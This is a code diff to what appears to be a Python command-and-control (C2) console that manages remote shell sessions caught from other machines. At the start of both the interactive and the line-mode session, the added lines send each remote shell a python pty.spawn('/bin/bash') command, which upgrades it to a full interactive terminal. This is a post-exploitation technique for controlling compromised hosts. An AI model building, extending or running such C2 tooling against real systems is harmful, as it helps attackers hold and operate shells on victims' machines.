@@ -357,6 +357,11 @@ def interactive_shell_session(shell_id: int):
 
     try:
         shell_socket.setblocking(False)
+        # Attempt to upgrade to a proper PTY-backed bash for better interactivity
+        try:
+            shell_socket.sendall(b"python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty,os; pty.spawn(\"/bin/bash\")' 2>/dev/null\n")
+        except Exception:
+            pass
         # Proactively request a prompt from remote shell (POSIX-safe)
         try:
             shell_socket.sendall(b'printf "%s" "${PS1:-$ }"\n')
@@ -474,6 +479,8 @@ def enter_shell_session(shell_id: int):
     print(f"[+] Interacting with shell {shell_id} in line mode. Type commands and press Enter. Press Ctrl-C to return to C2 console.")
     # Try to request a prompt immediately in line mode as well
     try:
+        # Attempt to upgrade to a proper PTY-backed bash for better interactivity
+        shell_sessions[shell_id]['socket'].sendall(b"python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty,os; pty.spawn(\"/bin/bash\")' 2>/dev/null\n")
         shell_sessions[shell_id]['socket'].sendall(b'printf "%s" "${PS1:-$ }"\n')
     except Exception:
         pass
